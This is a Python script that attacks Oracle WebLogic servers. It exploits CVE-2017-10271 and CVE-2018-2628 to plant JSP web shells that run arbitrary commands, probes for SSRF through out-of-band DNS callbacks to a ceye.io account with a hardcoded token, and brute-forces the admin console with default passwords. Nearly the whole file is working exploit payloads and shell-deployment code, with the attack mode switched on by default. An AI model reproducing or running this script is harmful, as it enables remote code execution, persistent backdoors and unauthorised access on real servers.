#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import sys
import json
import time
import socket
import random
import requests
from string import letters
from urlparse import urlparse

socket.setdefaulttimeout(5)

reload(sys)
sys.setdefaultencoding('utf-8')


Attack=True


ceye_domain = 'x.ceye.io'
ceye_api = '2ac0ac1cdda59cb5ea6e034d5f15f178'


weblogic={
        'users':['weblogic'],
        'passwords':['Oracle@123','weblogic','password','manager','admin123','123456','Weblogic1','weblogic10','weblogic10g','weblogic11','weblogic11g','weblogic12','weblogic12g','weblogic13','weblogic13g','weblogic123','12345678','123456789','admin888','admin1','administrator','8888888','123123','admin','root','Oracle@123']
        }


def ceye_dnslog(api_url,banner):
    req=requests.get(api_url)
    try:
        name = req.json()['data'][0]['name']
        if banner in name:
            return True
    except Exception:
        return False


def confirm(shell_url):
    redirects =['location.href','history.back(-1)','history.go(-1)']
    try:
        resp = requests.get(url=shell_url.strip(), allow_redirects=False)
        length = int(resp.headers['Content-Length'])
        if resp.status_code == 200 and length !=0:
            for _ in redirects:
                if _ in resp.content: return False
            return shell_url
    except:
        pass
    return False


def format_target(url):
    if '://' in url:
        netloc = urlparse(url).netloc
    else:
        netloc=url
    return netloc

headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
        "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
        "Content-Type": "text/xml"
    }




#CVE-2017-10271,可以直接getshell
def wls_wsat_XMLDecoder(url):
    netloc=format_target(url)
    points=['/wls-wsat/CoordinatorPortType','/wls-wsat/CoordinatorPortType11']
    shell_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zero.jsp</string><void method="println"><string><![CDATA[<%   if("v".equals(request.getParameter("pwd"))){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b));}out.print("</pre>");} %>]]></string></void><void method="close"/></void></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'''
    verify=['''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>cmd</string></void><void index="1"><string>/c</string></void><void index="2"><string>ping -n 1 {}.{}</string></void></array><void method="start"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>''',
            '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>ping -c 1 {}.{}</string></void></array><void method="start"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'''
            ]
    if Attack:
        try:
            for point in points:
                query='http://' + netloc+point
                req=requests.post(query, data=shell_payload, headers=headers, timeout=15)  # attack
                shell_url =  url + '/bea_wls_internal/zero.jsp?pwd=v&i=whoami'
                return confirm(shell_url)
        except Exception:
            return False
    else:
        try:
            for point in points:
                query='http://' + netloc+point
                for poc in verify:
                    banner = ''.join([random.choice(letters) for i in range(6)])
                    api_url = 'http://api.ceye.io/v1/records?token={}&type=dns&filter={}'.format(ceye_api, banner)
                    requests.post(query, data=poc.format(banner,ceye_domain), headers=headers, timeout=15)  # verify
                    time.sleep(3)
                    if ceye_dnslog(api_url, banner):
                        return query if query else False
        except Exception:
            return False



class WLS_Core_Components:

    def __init__(self,url):
        self.netloc=format_target(url)
        self.dip=self.netloc.split(':')[0]
        self.dport=int(self.netloc.split(':')[1])
        self.VUL=['CVE-2018-2628']
        self.PAYLOAD = ['aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078']
        self.VER_SIG = ['\\$Proxy[0-9]+']

    def t3handshake(self,sock, server_addr):
        sock.connect(server_addr)
        sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
        time.sleep(1)
        sock.recv(1024)
        # print 'handshake successful'

    def buildT3RequestObject(self,sock):
        data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
        data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format(
            '{:04x}'.format(self.dport))
        data3 = '1a7727000d3234322e323134'
        data4 = '2e312e32353461863d1d0000000078'
        for d in [data1, data2, data3, data4]:
            sock.send(d.decode('hex'))
        time.sleep(2)
        # print 'send request payload successful,recv length:%d'%(len(sock.recv(2048)))

    def sendEvilObjData(self,sock, data):
        payload = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
        payload += data
        payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
        payload = '%s%s' % ('{:08x}'.format(len(payload) / 2 + 4), payload)
        sock.send(payload.decode('hex'))
        time.sleep(2)
        sock.send(payload.decode('hex'))
        res = ''
        count = 1024
        try:
            while True:
                res += sock.recv(4096)
                time.sleep(0.1)
                count -= 1
                if count <= 0:
                    break
        except Exception as e:
            pass
        return res


    def checkVul(self,res, server_addr, index):
        p = re.findall(self.VER_SIG[index], res, re.S)
        if len(p) > 0:
            # print '%s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index])
            return True
        return False

    def do_run(self,index):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
        sock.settimeout(25)
        server_addr = (self.dip, self.dport)
        self.t3handshake(sock, server_addr)
        self.buildT3RequestObject(sock)
        if Attack:
            return self.attack(sock)
        else:
            rs = self.sendEvilObjData(sock, self.PAYLOAD[index])
            # print 'rs',rs
            return self.checkVul(rs, server_addr, index)

    def run(self):
        try:
            res = self.do_run(0)
            if res:
                if Attack:
                    return res
                else:
                    return self.dip+':'+str(self.dport)
            return False
        except Exception, e:
            pass
        return False



    def attack(self,sock):
        shell = '3c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d0d0a253e'
        payload = '00000767056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d4'
        payload += shell
        payload +='7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c776c73636d642e6a7370c0807702005c7878fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
        sock.send(payload.decode('hex'))
        time.sleep(2)
        sock.send(payload.decode('hex'))
        time.sleep(2)
        url='http://'+self.dip+':'+str(self.dport)
        shell_url = url + '/bea_wls_internal/wlscmd.jsp?tom=NzU1Ng'
        try:
            req=requests.get(url=shell_url,headers=headers, timeout=15)
            if req.ok and 'weblogic' in req.content:
                return shell_url.replace('NzU1Ng','d2hvYW1p')
        except BaseException as e:
            return False
        return False


def core_Components(url):
    poc = WLS_Core_Components(url)
    vulnerable = poc.run()
    return vulnerable


def weblogci_ssrf(url):
    if '://' not in url:
        url='http'+url
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               "User-Agent": "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"}
    banner = ''.join([random.choice(letters) for i in range(6)])
    query='''/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator='''
    payload=query+'http://{}.{}'.format(banner,ceye_domain)
    api_url = 'http://api.ceye.io/v1/records?token={}&type=dns&filter={}'.format(ceye_api, banner)
    try:
        req = requests.get(url=url+payload, headers=headers, timeout=20)
    except BaseException as e:
        pass
    time.sleep(2)
    if ceye_dnslog(api_url, banner):
        return url+query+url
    return False


def weblogic_weak(url):
    users_pwds=[]
    if '://' not in url:
        url='http'+url
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               "User-Agent": "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"}
    for user in weblogic['users']:
        for pwd in weblogic['passwords']:
            users_pwds.append((user, pwd))
    login_url = url + '/console/j_security_check'
    for user, pwd in users_pwds:
        data = {"j_username": user, "j_password": pwd}
        try:
            resp = requests.post(url=login_url, data=data,headers=headers, timeout=10)
            if resp.url.endswith('LoginForm.jsp'):
                return False
            elif 'console.portal' in resp.url:
                return login_url+' '*5+user+' : '+pwd
        except Exception as e:
            print e
            return False



def poc(url):
    info={}
    CVE_2017_10271= wls_wsat_XMLDecoder(url)
    CVE_2018_2628 = core_Components(url)
    Weblogci_ssrf = weblogci_ssrf(url)
    Weblogic_weak =weblogic_weak(url)
    if CVE_2018_2628:
        info.update({"CVE_2018_2628": CVE_2018_2628})
    if CVE_2017_10271:
        info.update({"CVE_2017_10271": CVE_2017_10271})
    if Weblogci_ssrf:
        info.update({"Weblogci_ssrf": Weblogci_ssrf})
    if Weblogic_weak:
        info.update({"Weblogic_weak": Weblogic_weak})
    if len(info)>0:
        return json.dumps(info,indent=2,ensure_ascii=False)
    else:
        return False



if __name__ == '__main__':
    print poc('http://127.0.0.1:7001')


